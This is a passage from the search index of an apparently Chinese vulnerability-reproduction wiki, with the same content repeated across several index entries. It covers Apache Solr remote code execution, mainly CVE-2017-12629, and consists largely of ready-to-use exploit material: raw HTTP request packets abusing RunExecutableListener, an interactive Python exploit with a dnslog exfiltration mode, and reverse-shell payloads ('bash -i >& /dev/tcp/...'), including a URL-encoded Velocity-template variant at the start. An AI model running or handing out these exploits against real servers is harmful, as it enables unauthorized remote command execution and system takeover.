>&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \" %2F bin %2F bash%20-c %20% 24 %40% 7Cbash %200% 20echo%20bash%20-i %20% 3E %26% 2Fdev %2F tcp %2F{}%2F{}%200% 3E%261\" . format ( IP , PORT ) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom= %23s et($x= %27% 27)+ %23s et($rt=$x.class.forName(%27java.lang.Runtime%27))+ %23s et($chr=$x.class.forName(%27java.lang.Character%27))+ %23s et($str=$x.class.forName(%27java.lang.String%27))+ %23s et($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+ %23s et($out=$ex.getInputStream())+ %23f oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read())) %23e nd\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vnul_url , headers = headers ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) file_name = str ( input ( \" \\033 [35mPlease input File Name \\n Zip >>> \\033 [0m\" )) vuln_url , core = POC_1 ( target_url , file_name ) POC_2 ( target_url , core ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) elif cmd == \"shell\" : IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_4 ( target_url , core , IP , PORT ) else : POC_3 ( target_url , core , cmd )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/","text":"Apache Solr RCE \u8fdc\u7a0b\u6267\u884c\u6f0f\u6d1e CVE-2017-12629 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache Solr \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002\u539f\u7406\u5927\u81f4\u662f\u6587\u6863\u901a\u8fc7Http\u5229\u7528XML\u52a0\u5230\u4e00\u4e2a\u641c\u7d22\u96c6\u5408\u4e2d\u3002\u67e5\u8be2\u8be5\u96c6\u5408\u4e5f\u662f\u901a\u8fc7 http\u6536\u5230\u4e00\u4e2aXML/JSON\u54cd\u5e94\u6765\u5b9e\u73b0\u3002\u6b64\u6b217.1.0\u4e4b\u524d\u7248\u672c\u603b\u5171\u7206\u51fa\u4e24\u4e2a\u6f0f\u6d1e\uff1a XML\u5b9e\u4f53\u6269\u5c55\u6f0f\u6d1e\uff08XXE\uff09 \u548c\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08RCE\uff09\uff0c\u4e8c\u8005\u53ef\u4ee5\u8fde\u63a5\u6210\u5229\u7528\u94fe\uff0c\u7f16\u53f7\u5747\u4e3aCVE-2017-12629\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Solr < 7.1 \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u00b6 \u5148\u8bf7\u6c42url\u5730\u5740\u83b7\u53d6 core \u5185\u5bb9 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] \u901a\u8fc7\u67e5\u770b\u4ee3\u7801\uff0c\u80fd\u591f\u89e6\u53d1\u547d\u4ee4\u6267\u884c\u7684\u4e8b\u4ef6\u6709\u4e24\u4e2a\uff1apostCommit \u548c newSearcher \u4f7f\u7528 postCommit \u00b6 \u7b2c\u4e00\u4e2a\u8bf7\u6c42\u5305\u7528\u4e8e\u8f7d\u5165\u7f13\u5b58\u4e2d [!NOTE] exe : ping \u6267\u884c\u7684\u547d\u4ee4 dir: \u547d\u4ee4\u5b58\u5728\u7684\u76ee\u5f55\u4f4d\u7f6e args:\u547d\u4ee4\u53c2\u6570 \u5982\u4e0b\u8bf7\u6c42\u5305\u6267\u884c\u7684\u662f /bin/ping 1.1.1.1 POST /solr/demo/co nf ig HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx : 8983 Co nne c t io n : close Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 198 { \"add-listener\" : { \"event\" : \"postCommit\" , \"name\" : \"newlistener-1\" , \"class\" : \"solr.RunExecutableListener\" , \"exe\" : \"ping\" , \"dir\" : \"/bin/\" , \"args\" :[ \"1.1.1.1\" ] } } \u7b2c\u4e8c\u4e2a\u8bf7\u6c42\u5305\u7528\u4e8e\u66f4\u65b0\u7f13\u5b58\u5e76\u6267\u884c\u547d\u4ee4 POST /solr/demo/upda te HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx : 8983 Co nne c t io n : close Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 198 [{ \"id\" : \"test\" }] [!NOTE] \u6ce8\u610f \u7b2c\u4e00\u4e2a\u8bf7\u6c42\u5305\u7684\u8fd9\u4e2a\u4f4d\u7f6e \"name\":\"newlistener-1\", listerer\u7684\u540d\u5b57\u9700\u8981\u66ff\u6362\uff0c\u4f8b\u5982\u7b2c\u4e00\u6b21 \u4e3a newlistener-1 \uff0c\u7b2c\u4e8c\u6b21\u5219\u9700\u8981\u6539\u4e3a newlistener-2 \u6ce8\u610f \u7b2c\u4e8c\u4e2a\u8bf7\u6c42\u5305\u7684\u8fd9\u4e2a\u4f4d\u7f6e [{\"id\":\"test\"}]\uff0c \u540c\u7b2c\u4e00\u4e2a\u8bf7\u6c42\u5305\u7684name\uff0c\u6bcf\u6267\u884c\u4e00\u6b21\u5c31\u9700\u8981\u66f4\u6362 id ,\u4f8b\u5982\u7b2c\u4e00\u6b21 \u4e3a test \uff0c\u7b2c\u4e8c\u6b21\u5219\u9700\u8981\u6539\u4e3a tset-2 \u6ce8\u610f Content-Type: application/json \u9700\u8981\u6dfb\u52a0 \u4e0d\u66f4\u6539\u6267\u884c\u53d1\u751f\u62a5\u9519\u793a\u4f8b \u8fdb\u5165docker\u5bb9\u5668\u67e5\u770b\u53d1\u73b0\u547d\u4ee4\u5df2\u7ecf\u6267\u884c \u4f7f\u7528 newSearcher \u00b6 \u4f7f\u7528 newSearcher\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u5165\u7f13\u5b58\u6267\u884c\u547d\u4ee4 \u8bf7\u6c42\u5305\u5982\u4e0b POST /solr/demo/co nf ig HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx : 8983 Co nne c t io n : close Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 198 { \"add-listener\" : { \"event\" : \"newSearcher\" , \"name\" : \"newlistener-2\" , \"class\" : \"solr.RunExecutableListener\" , \"exe\" : \"bash\" , \"dir\" : \"/bin/\" , \"args\" :[ \"-c\" , \"mkdir /tmp/vuln\" , ] } } [!NOTE] \u6ce8\u610f\u70b9\u540c\u4e0a\uff0c\u4e5f\u9700\u8981\u6bcf\u6b21\u6267\u884c\u66f4\u6539 \"name\":\"newlistener-2\" \u7684\u53c2\u6570 \u6210\u529f\u6267\u884c\u4e86\u521b\u5efa\u6587\u4ef6\u7684\u547d\u4ee4 \u5173\u4e8e \u00b6 \u5982\u679c\u60f3\u8981\u6267\u884c\u5176\u4ed6\u547d\u4ee4,\u5219\u9700\u8981\u547d\u4ee4\u7684\u7684\u4f4d\u7f6e\uff0c\u4f8b\u5982\u6267\u884cping\uff0c\u5219\u9700\u8981\u8bbe\u7f6edir\u53c2\u6570\u4e3a /usr/bin/ping \u6216\u8005 /bin/ping\uff0c\u5982\u679c\u9700\u8981\u68c0\u6d4b\u6f0f\u6d1e\u662f\u5426\u5b58\u5728\u5219\u53ef\u4ee5\u4f7f\u7528 dnslog\u6765\u68c0\u6d4b \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr < 7.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2017-12629.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mcmd >>> dnslog\u5730\u5740(\u6f0f\u6d1e\u5916\u8fde\u68c0\u6d4b) \\033 [0m' ) print ( '+ \\033 [36mCmd >>> shell(\u53cd\u5f39shell) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name , dnslog_url , n ): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche- %s \",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\" %s \"]}} \"\"\" % ( n , dnslog_url ) response = requests . request ( \"POST\" , url = exp_url , headers = headers , data = payload_cmd , timeout = 30 ) if \"add-listener\" in response . text : print ( \" \\033 [32m[o] \u6210\u529f\u6267\u884c\uff0c\u8bf7\u67e5\u770bdnslog \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) def POC_3 ( target_url , core_name , n , ip , port ): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche- %s \",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/ %s / %s 0>&1\"]}} \"\"\" % ( n , ip , port ) response = requests . request ( \"POST\" , url = exp_url , headers = headers , data = payload_cmd , timeout = 30 ) if \"add-listener\" in response . text : print ( \" \\033 [32m[o] \u6210\u529f\u6267\u884c \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) while True : n = random . randint ( 1 , 9999 ) cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : exit ( 0 ) elif cmd == \"shell\" : IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_3 ( target_url , core_name , n , IP , PORT ) elif cmd == \"dnslog\" : dnslog_url = str ( input ( ' \\033 [35m\u8bf7\u8f93\u5165\u4f60\u7684dnslog\u5730\u5740\uff1a \\033 [0m' )) POC_2 ( target_url , core_name , dnslog_url , n ) [!NOTE] \u5982\u679cshell\u6216dnslog\u65e0\u53cd\u5e94\uff0c\u53ef\u4ee5\u9009\u62e9\u66f4\u6539\u4e00\u4e0bPOC\u7684\u90e8\u5206\u53c2\u6570\u6267\u884c\u9700\u8981\u7684\u4ee3\u7801 \u53c2\u8003\u6587\u7ae0 \u00b6 Apache Solr\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2017-12629\uff09\u4ece\u5229\u7528\u5230\u5165\u4fb5\u68c0\u6d4b cve-2017-12629 apache solr xxe & rce \u6f0f\u6d1e\u5206\u6790","title":"Apache Solr RCE \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2017-12629"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#apache-solr-rce-\u8fdc\u7a0b\u6267\u884c\u6f0f\u6d1e-cve-2017-12629","text":"","title":"Apache Solr RCE \u8fdc\u7a0b\u6267\u884c\u6f0f\u6d1e CVE-2017-12629"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache Solr \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002\u539f\u7406\u5927\u81f4\u662f\u6587\u6863\u901a\u8fc7Http\u5229\u7528XML\u52a0\u5230\u4e00\u4e2a\u641c\u7d22\u96c6\u5408\u4e2d\u3002\u67e5\u8be2\u8be5\u96c6\u5408\u4e5f\u662f\u901a\u8fc7 http\u6536\u5230\u4e00\u4e2aXML/JSON\u54cd\u5e94\u6765\u5b9e\u73b0\u3002\u6b64\u6b217.1.0\u4e4b\u524d\u7248\u672c\u603b\u5171\u7206\u51fa\u4e24\u4e2a\u6f0f\u6d1e\uff1a XML\u5b9e\u4f53\u6269\u5c55\u6f0f\u6d1e\uff08XXE\uff09 \u548c\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08RCE\uff09\uff0c\u4e8c\u8005\u53ef\u4ee5\u8fde\u63a5\u6210\u5229\u7528\u94fe\uff0c\u7f16\u53f7\u5747\u4e3aCVE-2017-12629\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Solr < 7.1","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u6f0f\u6d1e\u590d\u73b0","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","text":"\u5148\u8bf7\u6c42url\u5730\u5740\u83b7\u53d6 core \u5185\u5bb9 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] \u901a\u8fc7\u67e5\u770b\u4ee3\u7801\uff0c\u80fd\u591f\u89e6\u53d1\u547d\u4ee4\u6267\u884c\u7684\u4e8b\u4ef6\u6709\u4e24\u4e2a\uff1apostCommit \u548c newSearcher","title":"\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u4f7f\u7528-postcommit","text":"\u7b2c\u4e00\u4e2a\u8bf7\u6c42\u5305\u7528\u4e8e\u8f7d\u5165\u7f13\u5b58\u4e2d [!NOTE] exe : ping \u6267\u884c\u7684\u547d\u4ee4 dir: \u547d\u4ee4\u5b58\u5728\u7684\u76ee\u5f55\u4f4d\u7f6e args:\u547d\u4ee4\u53c2\u6570 \u5982\u4e0b\u8bf7\u6c42\u5305\u6267\u884c\u7684\u662f /bin/ping 1.1.1.1 POST /solr/demo/co nf ig HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx : 8983 Co nne c t io n : close Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 198 { \"add-listener\" : { \"event\" : \"postCommit\" , \"name\" : \"newlistener-1\" , \"class\" : \"solr.RunExecutableListener\" , \"exe\" : \"ping\" , \"dir\" : \"/bin/\" , \"args\" :[ \"1.1.1.1\" ] } } \u7b2c\u4e8c\u4e2a\u8bf7\u6c42\u5305\u7528\u4e8e\u66f4\u65b0\u7f13\u5b58\u5e76\u6267\u884c\u547d\u4ee4 POST /solr/demo/upda te HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx : 8983 Co nne c t io n : close Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 198 [{ \"id\" : \"test\" }] [!NOTE] \u6ce8\u610f \u7b2c\u4e00\u4e2a\u8bf7\u6c42\u5305\u7684\u8fd9\u4e2a\u4f4d\u7f6e \"name\":\"newlistener-1\", listerer\u7684\u540d\u5b57\u9700\u8981\u66ff\u6362\uff0c\u4f8b\u5982\u7b2c\u4e00\u6b21 \u4e3a newlistener-1 \uff0c\u7b2c\u4e8c\u6b21\u5219\u9700\u8981\u6539\u4e3a newlistener-2 \u6ce8\u610f \u7b2c\u4e8c\u4e2a\u8bf7\u6c42\u5305\u7684\u8fd9\u4e2a\u4f4d\u7f6e [{\"id\":\"test\"}]\uff0c \u540c\u7b2c\u4e00\u4e2a\u8bf7\u6c42\u5305\u7684name\uff0c\u6bcf\u6267\u884c\u4e00\u6b21\u5c31\u9700\u8981\u66f4\u6362 id ,\u4f8b\u5982\u7b2c\u4e00\u6b21 \u4e3a test \uff0c\u7b2c\u4e8c\u6b21\u5219\u9700\u8981\u6539\u4e3a tset-2 \u6ce8\u610f Content-Type: application/json \u9700\u8981\u6dfb\u52a0 \u4e0d\u66f4\u6539\u6267\u884c\u53d1\u751f\u62a5\u9519\u793a\u4f8b \u8fdb\u5165docker\u5bb9\u5668\u67e5\u770b\u53d1\u73b0\u547d\u4ee4\u5df2\u7ecf\u6267\u884c","title":"\u4f7f\u7528 postCommit"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u4f7f\u7528-newsearcher","text":"\u4f7f\u7528 newSearcher\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u5165\u7f13\u5b58\u6267\u884c\u547d\u4ee4 \u8bf7\u6c42\u5305\u5982\u4e0b POST /solr/demo/co nf ig HTTP/ 1.1 Hos t : xxx.xxx.xxx.xxx : 8983 Co nne c t io n : close Co ntent - Type : applica t io n /jso n Co ntent - Le n g t h : 198 { \"add-listener\" : { \"event\" : \"newSearcher\" , \"name\" : \"newlistener-2\" , \"class\" : \"solr.RunExecutableListener\" , \"exe\" : \"bash\" , \"dir\" : \"/bin/\" , \"args\" :[ \"-c\" , \"mkdir /tmp/vuln\" , ] } } [!NOTE] \u6ce8\u610f\u70b9\u540c\u4e0a\uff0c\u4e5f\u9700\u8981\u6bcf\u6b21\u6267\u884c\u66f4\u6539 \"name\":\"newlistener-2\" \u7684\u53c2\u6570 \u6210\u529f\u6267\u884c\u4e86\u521b\u5efa\u6587\u4ef6\u7684\u547d\u4ee4","title":"\u4f7f\u7528 newSearcher"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u5173\u4e8e","text":"\u5982\u679c\u60f3\u8981\u6267\u884c\u5176\u4ed6\u547d\u4ee4,\u5219\u9700\u8981\u547d\u4ee4\u7684\u7684\u4f4d\u7f6e\uff0c\u4f8b\u5982\u6267\u884cping\uff0c\u5219\u9700\u8981\u8bbe\u7f6edir\u53c2\u6570\u4e3a /usr/bin/ping \u6216\u8005 /bin/ping\uff0c\u5982\u679c\u9700\u8981\u68c0\u6d4b\u6f0f\u6d1e\u662f\u5426\u5b58\u5728\u5219\u53ef\u4ee5\u4f7f\u7528 dnslog\u6765\u68c0\u6d4b","title":"\u5173\u4e8e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20RCE%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr < 7.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2017-12629.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mcmd >>> dnslog\u5730\u5740(\u6f0f\u6d1e\u5916\u8fde\u68c0\u6d4b) \\033 [0m' ) print ( '+ \\033 [36mCmd >>> shell(\u53cd\u5f39shell) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name , dnslog_url , n ): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche- %s \",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\" %s \"]}} \"\"\" % ( n , dnslog_url ) response = requests . request ( \"POST\" , url = exp_url , headers = headers , data = payload_cmd , timeout = 30 ) if \"add-listener\" in response . text : print ( \" \\033 [32m[o] \u6210\u529f\u6267\u884c\uff0c\u8bf7\u67e5\u770bdnslog \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) def POC_3 ( target_url , core_name , n , ip , port ): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\" : \"application/json\" , \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche- %s \",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/ %s / %s 0>&1\"]}} \"\"\" % ( n , ip , port ) response = requests . request ( \"POST\" , url = exp_url , headers = headers , data = payload_cmd , timeout = 30 ) if \"add-listener\" in response . text : print ( \" \\033 [32m[o] \u6210\u529f\u6267\u884c \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) while True : n = random . randint ( 1 , 9999 ) cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : exit ( 0 ) elif cmd == \"shell\" : IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_3 ( target_url , core_name , n , IP , PORT ) elif cmd == \"dnslog\" : dnslog_url = str ( input ( ' \\033 [35m\u8bf7\u8f93\u5165\u4f60\u7684dnslog\u5730\u5740\uff1a \\033 [0m' )) POC_2 ( target_url , core_name , dnslog_url , n ) [!NOTE] 